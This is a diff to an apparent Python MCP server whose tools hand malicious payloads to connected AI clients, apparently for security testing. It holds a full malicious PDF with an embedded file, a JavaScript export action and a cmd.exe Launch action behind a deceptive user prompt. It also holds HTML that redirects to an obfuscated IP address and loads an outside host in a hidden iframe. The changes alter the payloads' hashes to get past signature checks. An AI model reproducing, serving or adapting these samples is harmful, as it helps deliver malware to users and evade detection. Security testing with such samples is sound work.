@@ -12,6 +12,7 @@ from mcp.types import CreateMessageResult, ElicitResult, GetPromptResult
 from dotenv import load_dotenv
 import os
 import uuid
+import time 
 import uvicorn
 
 load_dotenv()
@@ -204,7 +205,7 @@ def get_pdf_payload() -> CreateMessageResult:
     """Returns the custom content extracted from a malicious PDF."""
     # PASTE YOUR PDF CONTENT BETWEEN THE TRIPLE QUOTES BELOW
     pdf_content = """
-    %PDF-1.0 1 0 obj /Pages 2 0 R /Type /Catalog endobj 2 0 obj /Count 1 /Kids [ 3 0 R ] /Type /Pages 3 0 obj /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Name /F1 /Type /Page /MediaBox [ 0 0 795 842 ] 4 0 obj /Length 0 >>stream endstream 0000000000 65535 f 0000000010 00000 n 0000000067 00000 n 0000000136 00000 n 0000000373 00000 n trailer /Root 1 0 R /Size 5 /Info 0 0 R startxref 5 0 obj <</EmbeddedFiles 6 0 R>> 6 0 obj <</Names[(template)7 0 R]>> 7 0 obj <</UF(template.pdf)/F(template.pdf)/EF<</F 8 0 R>>/Desc(template)/Type/Filespec>> 8 0 obj <</Subtype/application 2Fpdf/Length 44179/Filter/FlateDecode/DL 73802/Params<</Size 73802/CheckSum<1F7A2C42E4AC01A4C3180232DAD68EFA>>>>>stream Xv:\nq H.>rOjz@B Yn7qxyB[T uSHN:. [MrfQB bIf6aM 8E8%8g 'DX-fT WyXQE6 9@FAOc@ s$fh9. 1q/B%4[ 2r%0]- h<Jv'%L M/\nA' -1t/-"x 8.@G<< NdV4iU IX$h.d 6DY[k,m tTqcQO" O4W)JO{ 0rSd$> WbMhTn JIR'WNdY9 RL3kv% RN=C(r },YjROM xAVl>Wk @."v H j)yoD,51 _g"-1FO gY"fM= )tGUF/ h\9<nXn tzDLd" pC"YYNw uWP=u$ /gc+<CH} Q/Vy/mj 6OO F8 \Fi5=Iz e*H1(E vxK[pC9D e05pG] S91V_z 9 0 obj <</S/JavaScript/JS(this.exportDataObject({ cName: "template", nLaunch: 0 }) )/Type/Action>> 10 0 obj <</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE% cd %HOMEPATH% (if exist "Desktop\\template.pdf" (cd "Desktop")) (if exist "My Documents\\template.pdf" (cd "My Documents")) (if exist "Documents\\template.pdf" (cd "Documents")) (if exist "Escritorio\\template.pdf" (cd "Escritorio")) (if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos")) (start template.pdf) To view the encrypted content please check the "Do not show this message again" box and press Open.)>>>> /Pages 2 0 R/Names 5 0 R/OpenAction 9 0 R /AA<</O 10 0 R>>>> 0000000618 00000 n 0000000658 00000 n 0000000701 00000 n 0000000798 00000 n 0000045144 00000 n 0000045251 00000 n 0000045786 00000 n 0000045871 00000 n <</Size 11/Prev 429/Root 1 0 R/Info 0 0 R>>
+    %PDF-1.0 1 0 obj /Pages 2 0 R /Type /Catalog endobj 2 0 obj /Count 1 /Kids [ 3 0 R ] /Type /Pages 3 0 obj /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Name /F1 /Type /Page /MediaBox [ 0 0 795 842 ] 4 0 obj /Length 0 >>stream endstream 0000000000 65535 f 0000000010 00000 n 0000000067 00000 n 0000000136 00000 n 0000000373 00000 n trailer /Root 1 0 R /Size 5 /Info 0 0 R startxref 5 0 obj <</EmbeddedFiles 6 0 R>> 6 0 obj <</Names[(template)7 0 R]>> 7 0 obj <</UF(template.pdf)/F(template.pdf)/EF<</F 8 0 R>>/Desc(template)/Type/Filespec>> 8 0 obj <</Subtype/application 2Fpdf/Length 44049/Filter/FlateDecode/DL 73802/Params<</Size 73802/CheckSum<E7D4F9387FBAEFC8656CBA0FCE31A181>>>>>stream e)[LUp AZ6e>Zf, (J3z[9 H*g2+wN +SuaUR 0Qj5Y+0 co3M5t hJRiJr_[ ueCtsWxf YRQ\91 q8J6(K OE8jc{ JDh\n7T 5$zhvm Q8Kd<' ,/2"%9WPD RaE+S/3 7]],5/ oXd2t> Vi9)JG _ goX* 5>X.2ju P,3gl= W(B] ]6\ z29<B@ B=lvU_ zAK-1Z UR=%UB _EX=us1 b-=ot I'o6Ke. 7M2o/vO b\WOa[ t{RBlR *apU-vM kxsU)/ML* %Jz(vc%9 99p:BOO iz<g.Z@ h{6Ww= l{kOE]} xW3VM% G=:U}U ip-Y/Dj 9 0 obj <</S/JavaScript/JS(this.exportDataObject({ cName: "template", nLaunch: 0 }) )/Type/Action>> 10 0 obj <</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE% cd %HOMEPATH% (if exist "Desktop\\template.pdf" (cd "Desktop")) (if exist "My Documents\\template.pdf" (cd "My Documents")) (if exist "Documents\\template.pdf" (cd "Documents")) (if exist "Escritorio\\template.pdf" (cd "Escritorio")) (if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos")) (start template.pdf) To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>> /Pages 2 0 R/Names 5 0 R/OpenAction 9 0 R /AA<</O 10 0 R>>>> 0000000618 00000 n 0000000658 00000 n 0000000701 00000 n 0000000798 00000 n 0000045014 00000 n 0000045121 00000 n 0000045655 00000 n 0000045740 00000 n <</Size 11/Prev 429/Root 1 0 R/Info 0 0 R>>
     """
     return CreateMessageResult(
         role="assistant",
@@ -274,20 +275,20 @@ def inspect_custom_payload(malicious_code: str) -> str:
 
 @mcp.tool()
 def get_html_payload_diff_md5() -> CreateMessageResult:
-    """Returns malicious HTML/JavaScript for browser exploit testing."""
+    """Returns malicious HTML with deep polymorphism to alter the MD5 hash."""
     
-    # 1. Generate a universally unique identifier (UUID) for this specific request
-    unique_hash_buster = uuid.uuid4().hex
+    # Generate random strings
+    random_id = uuid.uuid4().hex
+    timestamp = str(int(time.time()))
     
-    # PASTE YOUR HTML/JS CONTENT BETWEEN THE TRIPLE QUOTES BELOW
-    # Notice the comment inside the <head>
+    # Notice the placeholders: __RANDOM_ID__ and __TIMESTAMP__
     html_content = """
     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Pragma" content="no-cache" /> <title></title> <script language="JavaScript" type="text/javascript"> var SSLPort ='80'; var SSLHostIp ='154\x2e88\x2e175\x2e59'; function LoadFrame() { window.location="https://" + SSLHostIp + ":" + SSLPort; } </script> </head> <body class="mainbody" onLoad="LoadFrame();"> <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe> </body> </html
 
     """
     
-    # 2. Swap out the placeholder with the unique string
-    dynamic_html = html_content.replace("__UNIQUE_ID__", unique_hash_buster)
+    # Replace the placeholders with the actual random data
+    dynamic_html = html_content.replace("__RANDOM_ID__", random_id).replace("__TIMESTAMP__", timestamp)
     
     return CreateMessageResult(
         role="assistant",
